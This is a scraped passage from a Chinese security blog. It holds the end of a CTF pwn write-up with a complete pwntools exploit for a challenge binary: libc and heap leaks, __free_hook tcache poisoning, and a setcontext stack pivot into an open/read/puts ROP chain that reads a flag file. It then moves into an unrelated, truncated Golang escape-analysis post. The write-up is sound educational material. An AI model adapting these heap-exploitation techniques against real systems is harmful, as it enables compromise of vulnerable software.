<p>以上堆栈迁移与rop是同一个payload进行的, 需要精心计算, 还有一个坑就是在setcontext中有个判断, 失败的话就执行push rcx, 而rcx 为[rdx + 0xa8], 则在[rdx + 0xa8]处需要添加一个ret指令的地址,这样才能连接到我们精心构造的rop</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;gun&#x27;</span></span><br><span class="line"><span class="comment">#libc_path = &#x27;./libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">server_port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span>(<span class="params">t</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>(<span class="params">n</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">n, d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;I0gan&#x27;</span>)</span><br><span class="line">	buy(<span class="number">0x450</span>, <span class="string">&#x27;X&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">	buy(<span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">	load(<span class="number">0</span>)</span><br><span class="line">	shoot(<span class="number">1</span>)</span><br><span class="line">	buy(<span class="number">0x10</span>, <span class="string">&#x27;X&#x27;</span> * <span class="number">8</span> +<span class="string">&#x27;\n&#x27;</span>); <span class="comment"># 0</span></span><br><span class="line">	load(<span class="number">0</span>)</span><br><span class="line">	shoot(<span class="number">1</span>)</span><br><span class="line">	libc_base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">0x1ebf80</span> - <span class="number">96</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base :&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	<span class="comment"># release</span></span><br><span class="line">	load(<span class="number">1</span>)</span><br><span class="line">	shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak heap base</span></span><br><span class="line">	n = <span class="number">9</span></span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">		buy(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span> + <span class="built_in">str</span>(_) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">		load(n - i - <span class="number">1</span>)</span><br><span class="line">	shoot(n)</span><br><span class="line"></span><br><span class="line">	p = p64(<span class="number">0</span>) * <span class="number">0x10</span></span><br><span class="line">	p += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">	buy(<span class="number">0x410</span>, p) <span class="comment"># 0</span></span><br><span class="line">	buy(<span class="number">0x20</span>, <span class="string">&#x27;a\n&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">		buy(<span class="number">0x10</span>, <span class="string">&#x27;A\n&#x27;</span>) <span class="comment"># 1 ~ 7</span></span><br><span class="line"></span><br><span class="line">	load(<span class="number">7</span>)</span><br><span class="line">	load(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">	shoot(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">	load(<span class="number">0</span>)</span><br><span class="line">	shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	buy(<span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">	load(<span class="number">0</span>)</span><br><span class="line">	shoot(<span class="number">1</span>)</span><br><span class="line">	ru(<span class="string">&#x27;The &#x27;</span>)</span><br><span class="line">	leak = u64(r(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">	heap_base = leak - (<span class="number">0x55962cf186e0</span> - <span class="number">0x55962cf18000</span> )</span><br><span class="line">	li(<span class="string">&#x27;heap base&#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">	</span><br><span class="line">	libc.address = libc_base</span><br><span class="line">	setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x3d</span></span><br><span class="line">	free_hook  = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	rdx_and_call = libc_base + <span class="number">0x1547a0</span></span><br><span class="line">	pop_rax = libc_base + <span class="number">0x4a550</span></span><br><span class="line">	pop_rdi = libc_base + <span class="number">0x26b72</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x27529</span></span><br><span class="line">	pop_rdx_r12 = libc_base + <span class="number">0x11c1e1</span></span><br><span class="line">	ret = libc_base + <span class="number">0x25679</span></span><br><span class="line">	syscall = libc_base + <span class="number">0x2584d</span></span><br><span class="line"></span><br><span class="line">	p = p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(heap_base + <span class="number">0x750</span> + <span class="number">0x10</span>) <span class="comment"># set rdx</span></span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">	p += p64(setcontext) <span class="comment"># call [rdx + 0x20]</span></span><br><span class="line">	p += <span class="string">b&#x27;./flag\x00\x00&#x27;</span> <span class="comment"># heap_base + 0x750 + 0x38 = 0x788</span></span><br><span class="line">	p = p.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># rdx + 0x90</span></span><br><span class="line"></span><br><span class="line">	p += p64(<span class="number">0</span>)         <span class="comment"># prev_size</span></span><br><span class="line">	p += p64(<span class="number">0x31</span>)      <span class="comment"># size</span></span><br><span class="line">	p += p64(free_hook) <span class="comment"># fd</span></span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">	p += p64(heap_base + <span class="number">0x750</span> + <span class="number">0x100</span>) <span class="comment"># mov rsp, [rdx + 0xa0]</span></span><br><span class="line">	p += p64(ret) <span class="comment"># avoid push rcx</span></span><br><span class="line">	p = p.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	flag_addr = heap_base + <span class="number">0x788</span></span><br><span class="line">	<span class="comment"># open	</span></span><br><span class="line">	rop_open = flat([</span><br><span class="line">	pop_rdi , flag_addr,</span><br><span class="line">	pop_rsi , <span class="number">0</span>,</span><br><span class="line">	libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	])</span><br><span class="line"></span><br><span class="line">	rop_read = flat([</span><br><span class="line">	pop_rdi, <span class="number">3</span>,</span><br><span class="line">	pop_rsi, flag_addr,</span><br><span class="line">	pop_rdx_r12, <span class="number">0x100</span>, <span class="number">0</span>,</span><br><span class="line">	libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	])</span><br><span class="line"></span><br><span class="line">	rop_puts = flat([</span><br><span class="line">	pop_rdi, flag_addr,</span><br><span class="line">	libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	])</span><br><span class="line"></span><br><span class="line">	rop = rop_open</span><br><span class="line">	rop += rop_read</span><br><span class="line">	rop += rop_puts</span><br><span class="line">	p += rop</span><br><span class="line">	p += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">	buy(<span class="number">0x1c0</span>, p) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;setcontext: &#x27;</span> + <span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">	buy(<span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># for ajust  1</span></span><br><span class="line">	buy(<span class="number">0x20</span>, p64(rdx_and_call) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">	load(<span class="number">0</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00000000001547A0                 mov     rdx, [rdi+8]</span></span><br><span class="line"><span class="string">.text:00000000001547A4                 mov     [rsp+0C8h+var_C8], rax</span></span><br><span class="line"><span class="string">.text:00000000001547A8                 call    qword ptr [rdx+20h]</span></span><br><span class="line"><span class="string">.text:00000000001547AB                 mov     qword ptr [rbx], 0</span></span><br><span class="line"><span class="string">.text:00000000001547B2                 mov     rax, [rsp+0C8h+var_C8]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#setcontext</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 0x7f6c8f6f21c6 &lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]</span></span><br><span class="line"><span class="comment"># push rcx</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]</span></span><br><span class="line"><span class="string">.text:00000000000580E4                 mov     rbx, [rdx+80h]</span></span><br><span class="line"><span class="string">.text:00000000000580EB                 mov     rbp, [rdx+78h]</span></span><br><span class="line"><span class="string">.text:00000000000580EF                 mov     r12, [rdx+48h]</span></span><br><span class="line"><span class="string">.text:00000000000580F3                 mov     r13, [rdx+50h]</span></span><br><span class="line"><span class="string">.text:00000000000580F7                 mov     r14, [rdx+58h]</span></span><br><span class="line"><span class="string">.text:00000000000580FB                 mov     r15, [rdx+60h]</span></span><br><span class="line"><span class="string">.text:00000000000580FF                 test    dword ptr fs:48h, 2</span></span><br><span class="line"><span class="string">.text:000000000005810B                 jz      loc_581C6</span></span><br><span class="line"><span class="string">.text:0000000000058111                 mov     rsi, [rdx+3A8h]</span></span><br><span class="line"><span class="string">.text:0000000000058118                 mov     rdi, rsi</span></span><br><span class="line"><span class="string">.text:000000000005811B                 mov     rcx, [rdx+3B0h]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>









<h2 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h2><h3 id="应付orw"><a href="#应付orw" class="headerlink" title="应付orw"></a>应付orw</h3><h4 id="打入堆栈中"><a href="#打入堆栈中" class="headerlink" title="打入堆栈中"></a>打入堆栈中</h4><p>泄漏libc中的environ, 该变量中储存的是stack中的环境变量地址,这个可以泄漏堆栈地址, 从而可以打入堆栈中进行rop</p>
<h4 id="堆栈迁移至堆"><a href="#堆栈迁移至堆" class="headerlink" title="堆栈迁移至堆"></a>堆栈迁移至堆</h4><p>采用setcontext函数进行设置rsp, 然而再设置rsp的时候是根据rdx寄存器来进行设定的, 而平时在堆中, 若我们可以控制一个rdi, 找到一个rdx与rdi的对应关系, 我们就可以间接的修改rsp,在进行ret的时候就可以达到rop</p>
<p>找一个跳板</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx, qword ptr [rdi + 8]</span><br><span class="line">mov    qword ptr [rsp], rax</span><br><span class="line">call   qword ptr [rdx + 0x20] &lt;setcontext+61&gt;</span><br></pre></td></tr></table></figure>

<p>找到setcontext函数 + 61处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov     rsp, [rdx+0A0h]</span><br><span class="line">mov     rbx, [rdx+80h]</span><br><span class="line">mov     rbp, [rdx+78h]</span><br><span class="line">mov     r12, [rdx+48h]</span><br><span class="line">mov     r13, [rdx+50h]</span><br><span class="line">mov     r14, [rdx+58h]</span><br><span class="line">mov     r15, [rdx+60h]</span><br><span class="line">test    dword ptr fs:48h, 2</span><br><span class="line">jz      loc_581C6</span><br><span class="line">mov     rsi, [rdx+3A8h]</span><br><span class="line">mov     rdi, rsi</span><br><span class="line">mov     rcx, [rdx+3B0h]</span><br></pre></td></tr></table></figure>



<h4 id="快速查找指令"><a href="#快速查找指令" class="headerlink" title="快速查找指令"></a>快速查找指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -M intel -D libc.so.6 | grep &quot;mov    rdx,QWORD PTR \[rdi+0x8\]&quot;</span><br></pre></td></tr></table></figure>





<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/136983333">https://zhuanlan.zhihu.com/p/136983333</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194960">https://www.anquanke.com/post/id/194960</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/1167">http://blog.eonew.cn/archives/1167</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/29/new-heap-exploit/" data-id="ckhemv84l005hwdcma2r76jln" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-golang-escape-analysis" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/25/golang-escape-analysis/" class="article-date">
  <time datetime="2020-10-25T10:38:56.000Z" itemprop="datePublished">2020-10-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/golang/">golang</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/25/golang-escape-analysis/">Golang 逃逸分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Golang-逃逸学习"><a href="#Golang-逃逸学习" class="headerlink" title="Golang 逃逸学习"></a>Golang 逃逸学习</h1><p>golang的内存管理比较安全，不可直接操作内存，且在编译期间会进行数组越界检查，在运行的时候直接报错。</p>
<p>这篇文章就记录一下golang逃逸的一些相关原理吧。</p>
<h2 id="golang逃逸分析wiki"><a href="#golang逃逸分析wiki" class="headerlink" title="golang逃逸分析wiki"></a>golang逃逸分析wiki</h2><p>In compiler optimization, escape analysis is a method for determining the dynamic scope of pointers - where in the program a pointer can be accessed. It is related to pointer analysis and shape analysis.</p>
<p>When a variable (or an object) is allocated in a subroutine, a pointer to the variable can escape to other threads of execution, or to calling subroutines. If an implementation uses tail call optimization (usually required for functional languages), objects may also be seen as escaping to called subroutines. If a language supports first-class continuations (as do Scheme and Standard ML of New Jersey), portions of the call stack may also escape.</p>
<p>If a subroutine allocates an object and returns a pointer to it, the object can be accessed from undetermined places in the program — the pointer has “escaped”. Pointers can also escape if they are stored in global variables or other data structures that, in turn, escape the current procedure.</p>
<p>Escape analysis determines all the places where a pointer can be stored and whether the lifetime of the pointer can be proven to be restricted only to the current procedure and/or thread</p>
<h2 id="逃逸分析优势"><a href="#逃逸分析优势" class="headerlink" title="逃逸分析优势"></a>逃逸分析优势</h2><p>1 最大的好处应该是减少gc的压力，不逃逸的对象分配在栈上，当函数返回时就回收了资源，不需要gc标记清除。</p>
<p>2 因为逃逸分析完后可以确定哪些变量可以分配在栈上，栈的分配比堆快，性能好</p>
<p>3 同步消除，如果你定义的对象的方法上有同步锁，但在运行时，却只有一个线程在访问，此时逃逸分析后的机器码，会去掉同步锁运行。</p>
<h2 id="go与c-c-编译的程序区别"><a href="#go与c-c-编译的程序区别" class="headerlink" title="go与c/c++编译的程序区别"></a>go与c/c++编译的程序区别</h2><p>c/c++编译的程序，堆栈空间给的比较少，一般做大型项目的时候，数据量大了就把数据放在堆里储存，而go呢，内存机制有自己本身管理，采用堆栈迁移的方式把堆栈迁移到所开辟出来空间比较大的地方，所以golang 在运行完大多数对象都可以放在堆栈中。下面来跟踪一下golang程序的运行</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hack</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fake_flag := []<span class="keyword">int64</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">	<span class="keyword">var</span> p []<span class="keyword">int64</span></span><br><span class="line">	p = fake_flag</span><br><span class="line">	p[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    flag := []<span class="keyword">int64</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i, v := <span class="keyword">range</span> flag &#123;</span><br><span class="line">        flag[i] = v + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    